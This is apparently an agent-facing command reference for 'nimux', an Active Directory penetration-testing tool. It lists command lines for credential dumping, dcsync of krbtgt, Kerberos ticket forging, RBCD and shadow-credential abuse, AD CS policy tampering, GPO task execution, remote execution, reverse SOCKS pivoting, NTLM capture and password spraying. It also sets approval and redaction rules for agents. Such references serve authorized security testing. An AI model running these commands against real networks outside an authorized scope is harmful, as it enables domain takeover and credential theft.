# nimux Command Surface for Agents

This file summarizes the full `nimux` command surface for AI agents and MCP wrappers.

Use `nimux <command> --help` as the final source of truth for the installed binary.


## Version Awareness

Agents should treat local `nimux --help` as authoritative, but the 1.0.3 and 1.0.4 releases added behavior that older prompts may miss:

- 1.0.3 stabilized BloodHound Legacy output and ADCS RPC workflows: `--bloodhound --legacy`, ACL/object-control export, native `ICertAdminD2` policy get/set, RPC certificate requests, PKCS#12 output, PKINIT ccache generation, and Kerberos execution with explicit `--krb5-config`.
- 1.0.4 added LDAP capture server support and polished ADCS policy output: `nimux ldap --server`, `--srvhost`, `--srvport`, random or fixed `--challenge`, repeated LDAP captures, readable `DisableExtensionList` get output, and empty-value clearing for `--adcs-set-disable-extension-list`.

Do not assume these flags exist on older binaries. Check the local version and help output before building a workflow.

## Global Targets

Commands accept one or more targets:

```text
hostname
IPv4 or IPv6 literal
CIDR range
IPv4 inclusive range
@file with newline-separated targets
```

## Global Options

Common options:

```text
--port <spec>
--concurrency <n>
--timeout <ms>
--retries <n>
--json
--log <file>
--rollback-out <file>
--dry-run
--no-color
--proxy socks5://host:port
```

Authentication options:

```text
-u, --username <s>
-p, --password <s>
-H, --hash <s>
-d, --domain <s>
-k, --kerberos
--ccache <file>
--krb5-config <file>
--local-auth
```

Use `--proxy` after deploying a `nimux socks` pivot or when an authorized SOCKS5 proxy already exists.

## Command Families

```text
scan       TCP and UDP service discovery
smb        SMB negotiation, auth, enum, coercion, ticket capture
ldap       LDAP and AD query/write engine
kerberos   TGT, TGS, S4U, roasting, ticket conversion, forging
krb5conf   Generate krb5.conf for AD Kerberos
winrm      WinRM auth, command execution, shell, file helpers
scm        SCM command execution
bin        Helper service execution and shell
cim        WMI/DCOM Win32_Process.Create execution
tsch       Task Scheduler execution
mmc        DCOM IDispatch execution
socks      Native background SOCKS pivot helper
secrets    SAM, LSA, cached creds, DPAPI material
dcsync     Native MS-DRSR replication
mssql      MSSQL query, xp_cmdshell, linked servers, OLE, CLR
postgres   PostgreSQL auth, SQL client, COPY FROM PROGRAM shell
mysql      MySQL and MariaDB auth and interactive client
ssh        SSH auth, command, and shell
ftp        FTP auth and fingerprinting
vnc        VNC/RFB auth checks
nfs        NFS/RPC portmapper and export listing
afp        Apple Filing Protocol info and auth
webdav     WebDAV auth and listing
http       HTTP probe, dirs/files, vhosts, headers, title, body fingerprint
dns        Lightweight DNS subdomain enumeration
rdp        RDP probe, TLS cert, NTLM info
put        SMB file upload
get        SMB file download
ls         SMB directory listing
mkdir      SMB directory creation
rm         SMB file deletion
```

## scan

Use for TCP/UDP discovery.

```bash
nimux scan <target> --port 445,389,5985 --open --json
nimux scan <target> --udp --port 53,88,123,137,161,464 --json
nimux scan <target> --top-ports 100 --open --json
```

Useful options:

```text
--port <spec>
--top-ports <n>
-F
--udp
--Pn
--open
--debug-probe
-T<0..5>
--encrypt <n>
--rdp-proto <n>
-oG
-oC
-oX
```

## smb

Use for SMB auth, enumeration, read-only share spidering, local admin checks, RID brute, coercion, ticket capture, and hash maintenance.

```bash
nimux smb <host> --json
nimux smb <host> -u <user> -p '<password>' -d <domain> --shares --users --groups --pass-pol --json
nimux smb <host> -u <user> -H <nt_hash> -d <domain> --sessions --loggedon-users --json
nimux smb <host> -k --ccache <file> --krb5-config <file> -d <domain> --shares --json
nimux smb <host> -u <user> -p '<password>' -d <domain> --spider --max-depth 3 --interesting --json
nimux smb <host> -u <user> -p '<password>' -d <domain> --spider --share Shared --spider-pattern '*.kdbx,*password*' --json
```

Coercion and ticket capture:

```bash
nimux smb <listener-host> -u <admin> -H <nt_hash> -d <domain> \
  --coerce --coerce-target <spooler-host> --listener <listener-host> \
  --capture-tickets --capture-host <listener-host> \
  --ticket-user '<machine-account>$' --ticket-service krbtgt \
  --capture-seconds 20 --capture-interval 1 --capture-out captured-ticket
```

Useful options:

```text
--shares
--users
--groups
--pass-pol
--loggedon-users
--sessions
--disks
--spider
--share <name>
--remote <path>
--max-depth <n>
--spider-pattern <csv>
--size-limit <bytes>
--interesting
--rid-brute [n]
--rid-range <a-b>
--local-admins
--set-hash
--new-hash <ntlm>
--dialects <hex-list>
--coerce
--coerce-target <host>
--listener <host>
--capture-tickets
--capture-host <host>
--capture-out <path>
--ticket-user <s>
--ticket-service <s>
--capture-seconds <n>
--capture-interval <n>
--raw-ticket
```

## ldap

Use for AD enumeration and controlled AD writes.

Read-only examples:

```bash
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --query users --json
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --query dcs --query trusts --query admins --json
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --bloodhound --bloodhound-out bloodhound.zip
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --bloodhound --legacy --bloodhound-out bloodhound-legacy.zip
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --filter '(servicePrincipalName=*)' --attrs sAMAccountName,servicePrincipalName
```

Named queries include:

```text
users
computers
groups
trusts
admins
asreproast
kerberoast
gpos
schema
config
fgpp
deleted
locked
expired-passwords
stale-users
never-logged-on
sites
subnets
nested-groups
acl
dcs
dns
certs
unconstrained
constrained
rbcd-targets
passwd-notreqd
dont-expire
admincount
```

Write-capable workflows:

```bash
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --create user --name <name> --new-pass '<password>' --dry-run
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --create computer --name '<computer>$' --new-pass '<password>'
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --modify --dn '<dn>' --replace attr=value --dry-run
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --delete --dn '<dn>' --dry-run
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --ldif changes.ldif --dry-run
```

Common AD abuse and administration paths:

```bash
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --set-rbcd --from '<controlled>$' --to '<target>$' --rollback-out rbcd.jsonl
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --shadow-creds --user <target> --shadow-out target-shadow --rollback-out shadow.jsonl
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --create dmsa --name <name> --ou '<container-dn>' --target-dn '<preceding-account-dn>'
```

AD CS:

```bash
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --adcs
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --cert-inventory
nimux ldap <dc> -u <ca-manager> -H <nt_hash> -d <domain> --adcs-policy --ca '<ca-name>' --adcs-get-editflags --json
nimux ldap <dc> -u <ca-manager> -H <nt_hash> -d <domain> --adcs-policy --ca '<ca-name>' --adcs-get-disable-extension-list --json
nimux ldap <dc> -u <ca-manager> -H <nt_hash> -d <domain> --adcs-policy --ca '<ca-name>' --adcs-set-editflags <decimal-or-hex>
nimux ldap <dc> -u <ca-manager> -H <nt_hash> -d <domain> --adcs-policy --ca '<ca-name>' --adcs-set-disable-extension-list 1.3.6.1.4.1.311.25.2
nimux ldap <dc> -u <ca-manager> -H <nt_hash> -d <domain> --adcs-policy --ca '<ca-name>' --adcs-set-disable-extension-list ''
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --adcs-request --adcs-rpc --ca '<ca-name>' --template <template> --upn <user@domain> --sid <objectSid> --out cert-out.pfx
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --adcs-request --ca '<ca-name>' --template <template> --out cert-out
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --adcs-auth --upn <user@domain> --pfx cert-out.pfx --ccache user.ccache --krb5-config <domain>.krb5.conf
```

AD CS notes for agents:

- `--adcs-policy` uses CA administration rights over `ICertAdminD2`; it is not a generic LDAP write. Treat it as a CA configuration change requiring explicit approval and verification.
- `--adcs-get-disable-extension-list` should be shown to the user in normal text output as well as JSON.
- An empty string passed to `--adcs-set-disable-extension-list ''` clears the policy value. Do not insert a positional `set` argument.
- Restarting Certificate Services can be required before CA policy changes affect new requests; that is remote command execution and requires approval.
- `--adcs-request --adcs-rpc` creates certificate/key material. Record the emitted `.cer`, `.pfx`, and any CA PEM paths, but redact private key material.
- If PKINIT fails, inspect certificate identity details first: SAN UPN, SAN URL SID, and security extension SID can decide which principal Windows maps.
- Generate `krb5.conf` and pass `--krb5-config` for PKINIT and Kerberos SMB/WinRM/SCM paths when DNS or realm resolution is uncertain.

LDAP capture server:

```bash
nimux ldap --server
nimux ldap --server --srvhost 0.0.0.0 --srvport 2222
nimux ldap --server --srvhost <listen-ip> --srvport <port> --challenge <16-hex-chars>
nimux ldap --server --srvhost 0.0.0.0 --srvport 2222 --json
```

LDAP capture notes for agents:

- Default listen port is 389, not 2222. Use `--srvport` when a non-standard port is needed.
- If `--challenge` is omitted, nimux generates a random 8-byte NTLM challenge and prints it.
- The listener stays running and can capture repeated connections until interrupted.
- Normal output uses nimux-style panels for listener state, connections, simple binds, and NetNTLM captures; JSON mode emits one event per line.
- Captured passwords, NetNTLM hashes, and challenge/response material are secrets. Redact them unless the user explicitly asks to display them.


GPO:

```bash
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --gpo --create-gpo --name '<gpo>'
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --gpo --link '<gpo>' --target '<target-dn>' --dry-run
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --gpo --startup --name '<gpo>' --put ./startup.ps1
nimux ldap <dc> -u <user> -p '<password>' -d <domain> --gpo --schtask --name '<gpo>' --task-name '<task>' --task-cmd 'cmd.exe' --task-args '/c whoami'
```

Agent rule: use `--dry-run` and `--rollback-out` whenever supported before writes.

## kerberos and krb5conf

Use for Kerberos setup, ticket operations, S4U, roasting, conversion, and forging.

```bash
nimux krb5conf <dc> -d <domain> --out <domain>.krb5.conf
nimux kerberos <dc> -u <user> -p '<password>' -d <domain> --request kinit --out user.ccache
nimux kerberos <dc> -u <user> -H <nt_hash> -d <domain> --request asktgt --out user.ccache
nimux kerberos <dc> --request describe --ccache user.ccache --json
nimux kerberos <dc> --request ccache-to-kirbi --ccache user.ccache --out user.kirbi
nimux kerberos <dc> --request kirbi-to-ccache --kirbi user.kirbi --out imported.ccache
```

Request operations:

```text
ccache
describe
list
tickets
purge
renew
ccache-to-kirbi
kirbi-to-ccache
kinit
asktgt
getst
kerberoast
s4u2self
s4u2proxy
s4u
rbcd
constrained
kcd
```

S4U:

```bash
nimux kerberos <dc> -d <domain> --request s4u \
  --ccache svc.ccache --user <impersonated-user> --service cifs/<host> \
  --out delegated.ccache
```

Kerberoast:

```bash
nimux kerberos <dc> -d <domain> --request kerberoast \
  --ccache user.ccache --spn MSSQLSvc/sql01.domain.local:1433
```

Forge operations:

```text
golden
diamond
silver
inter-realm
```

Agent rule: do not forge tickets or request delegated tickets unless the user explicitly confirms scope and intent.

## winrm

Use for WinRM authentication, commands, interactive shell, file transfer, and managed assembly execution.

```bash
nimux winrm <host> -u <user> -p '<password>' -d <domain> --cmd whoami --json
nimux winrm <host> -u <user> -H <nt_hash> -d <domain> --cmd hostname --json
nimux winrm <host> -k --ccache user.ccache --krb5-config domain.krb5.conf -u <user> -d <domain> --spn WSMAN --shell
```

Shell helpers:

```text
cd <path>
upload <local> [remote]
download <remote> [local]
upload-dir <local> [remote]
download-dir <remote> [local]
execute-assembly <local> [args...]
```

Agent rule: ask before command execution, uploads, downloads of sensitive paths, or managed assembly execution.

## Remote execution transports

Use these only after explicit approval.

```bash
nimux scm <host> -u <admin> -H <nt_hash> -d <domain> --cmd "cmd.exe /c whoami"
nimux bin <host> -u <admin> -H <nt_hash> -d <domain> --cmd whoami
nimux bin <host> -u <admin> -H <nt_hash> -d <domain> --shell
nimux cim <host> -u <admin> -H <nt_hash> -d <domain> --cmd whoami
nimux tsch <host> -u <admin> -H <nt_hash> -d <domain> --cmd "cmd.exe /c whoami"
nimux mmc <host> -u <admin> -H <nt_hash> -d <domain> --cmd "cmd.exe /c whoami"
```

Aliases:

```text
service, smbexec -> scm
psexec, svc      -> bin
wmi, wmiexec     -> cim
task, sch, atexec -> tsch
com, dcom        -> mmc
```

## socks and proxy

Use `nimux socks` to deploy a background pivot helper. Then reuse `nimux` with `--proxy`.

```bash
nimux socks <pivot-host> -u <admin> -p '<password>' -d <domain> \
  --reverse --listener <operator-ip> --socks-port 1080 --control-port 1081

nimux scan <internal-cidr> --port 445,389,5985 --open --proxy socks5://127.0.0.1:1080 --json

nimux ldap <internal-dc> -u <user> -p '<password>' -d <domain> \
  --proxy socks5://127.0.0.1:1080 --query dcs --query trusts --json
```

Cleanup:

```bash
nimux socks <pivot-host> -u <admin> -p '<password>' -d <domain> \
  --kill --pid <pid> --socks-task <task-name> --remote <remote-helper-path>
```

Agent rule: record `local_proxy_url`, `pid`, `socks_task`, and `remote_helper_path`.

## secrets and dcsync

Use only after explicit approval.

```bash
nimux secrets <host> -u <admin> -H <nt_hash> -d <domain> --json
nimux secrets <host> -k --ccache admin.ccache --krb5-config domain.krb5.conf -u <admin> -d <domain> --json
nimux dcsync <dc> -u <user> -H <nt_hash> -d <domain> --user '<domain>\\krbtgt' --json
nimux dcsync <dc> -u <user> -H <nt_hash> -d <domain> --trust-keys --json
```

Agent rule: redact secrets, hashes, keys, and tickets by default.

## File operations

SMB file operations:

```bash
nimux put <host> -u <user> -p '<password>' -d <domain> --share <share> --local ./file.txt --remote path\\file.txt
nimux get <host> -u <user> -p '<password>' -d <domain> --share <share> --remote path\\file.txt --local ./file.txt
nimux ls <host> -u <user> -p '<password>' -d <domain> --share <share> --remote path
nimux mkdir <host> -u <user> -p '<password>' -d <domain> --share <share> --remote path
nimux rm <host> -u <user> -p '<password>' -d <domain> --share <share> --remote path\\file.txt
```

Agent rule: ask before upload, deletion, recursive transfer, or downloading sensitive paths.

## Database protocols

MSSQL:

```bash
nimux mssql <host> -u <user> -p '<password>' --query 'SELECT @@version'
nimux mssql <host> -u <user> -p '<password>' --cmd whoami
nimux mssql <host> -u <user> -p '<password>' --shell
nimux mssql <host> -u <user> -p '<password>' --link <server> --query 'SELECT @@SERVERNAME'
```

PostgreSQL:

```bash
nimux postgres <host> -u <user> -p '<password>' --query 'SELECT version();'
nimux postgres <host> -u <user> -p '<password>' --shell
```

MySQL:

```bash
nimux mysql <host> -u <user> -p '<password>'
nimux mysql <host> -u <user> -p '<password>' --cli
```

Agent rule: ask before `--cmd`, `--shell`, xp_cmdshell, OLE, CLR, COPY FROM PROGRAM, or linked-server execution.

## Other protocols

```bash
nimux ssh <host> -u <user> -p '<password>' --cmd whoami
nimux ssh <host> -u <user> -p '<password>' --shell
nimux ftp <host> -u <user> -p '<password>' --json
nimux vnc <host> -p '<password>' --json
nimux nfs <host> --json
nimux afp <host> -u <user> -p '<password>' --json
nimux webdav <host> -u <user> -p '<password>' --json
nimux http <host> --json
nimux http <host> --dirs <wordlist> --workers 100 --status 200,301,302,403 --baseline --json
nimux http <host> --dirs <wordlist> --auto-calibrate --recursion --depth 2 --extract-links --json
nimux http <host> --files <wordlist> --extensions php,txt,bak --filter-regex 'Not Found' -fs 325 --json
nimux http <ip> --vhosts <wordlist> -d <domain> --workers 100 --resume seen.jsonl --json
nimux dns <domain> --subdomains <wordlist> --workers 200 --json
nimux rdp <host> --json
```

Agent rule: treat SSH shell and command execution as execution actions requiring approval.

## Credential Spraying

Credential spray inputs are supported when username or password points to a file.

```text
--spray-delay <ms>
--max-attempts-per-user <n>
--lockout-aware
```

Agent rule: do not start spraying without explicit approval and lockout policy awareness.

## Agent Risk Matrix

Read-only by default:

```text
scan
smb without coercion, ticket capture, or hash changes
ldap queries, BloodHound output, and ADCS policy get operations
kerberos describe/list/conversion
krb5conf
http lightweight probe, dirs/files, and vhost discovery
dns subdomain enumeration
rdp
ftp auth checks
vnc auth checks
nfs enum
afp info/auth
webdav listing
mysql auth check
postgres query without command execution
mssql query without command execution or enable flags
ls
```

Requires explicit approval for execution:

```text
winrm --cmd or --shell
scm
bin
cim
tsch
mmc
ssh --cmd or --shell
mssql --cmd, --shell, --ole, --clr, linked command execution
postgres --cmd or --shell
winrm shell execute-assembly
```

Requires explicit approval for writes:

```text
ldap create, modify, delete, LDIF
ldap ACL edits
ldap RBCD writes
ldap shadow credentials
ldap certificate mapping
ldap AD CS requests when they create new certificate material
ldap AD CS policy changes (`--adcs-policy`, EditFlags, DisableExtensionList)
GPO create, link, unlink, set, put, delete, startup, schtask
SMB set-hash
put
mkdir
rm
password changes
group membership changes
```

Requires explicit approval for secrets:

```text
secrets
dcsync
dcsync --trust-keys
Kerberos ticket forging
ticket capture
LDAP capture server output containing passwords or NetNTLM hashes
DPAPI material collection
```

Requires explicit approval for deployment or routing:

```text
socks deploy
socks cleanup
LDAP capture listener on an exposed interface
using a pivot to access a new internal network segment
proxy_command through a stored pivot
```

Agent rule: every approved write should prefer `--rollback-out` when the command supports it.
